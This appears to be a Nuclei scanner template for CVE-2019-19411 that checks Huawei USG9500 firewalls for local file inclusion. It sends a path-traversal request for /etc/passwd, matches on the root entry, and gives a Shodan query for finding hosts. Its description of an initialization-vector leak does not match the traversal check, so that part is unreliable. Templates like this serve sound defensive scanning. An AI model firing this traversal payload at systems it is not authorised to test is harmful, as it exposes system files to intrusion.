id: CVE-2019-19411

info:
  name: Huawei Firewall - Local File Inclusion
  author: taielab
  severity: low
  description: |
    USG9500 with versions of V500R001C30SPC100, V500R001C30SPC200, V500R001C30SPC600, V500R001C60SPC500, V500R005C00SPC100, V500R005C00SPC200 have an information leakage vulnerability. Due to improper processing of the initialization vector used in a specific encryption algorithm, an attacker who gains access to this cryptographic primitive may exploit this vulnerability to cause the value of the confidentiality associated with its use to be diminished.
  reference:
    - https://www.huawei.com/en/psirt/security-advisories/huawei-sa-20200115-01-firewall-en
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 3.7
    cve-id: CVE-2019-19411
    cwe-id: CWE-665
    epss-score: 0.02952
    epss-percentile: 0.85928
    cpe: cpe:2.3:h:huawei:usg9500:-:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: huawei
    product: usg9500
    shodan-query: title:"HUAWEI"
  tags: cve,cve2019,huawei,firewall,lfi

http:
  - method: GET
    path:
      - "{{BaseURL}}/umweb/../etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:[x*]:0:0:"

      - type: word
        part: header
        words:
          - "application/octet-stream"

      - type: status
        status:
          - 200
# digest: 490a0046304402206c80c86d1eecde60464b5578446c3e7cb7eb147150c793300dcc6fd90f87dac9022024789c96dfd67c4766f8bb7f67d3a0c1c512198d920de221fbfb7891c3c343dd:922c64590222798bb761d5b6d8e72950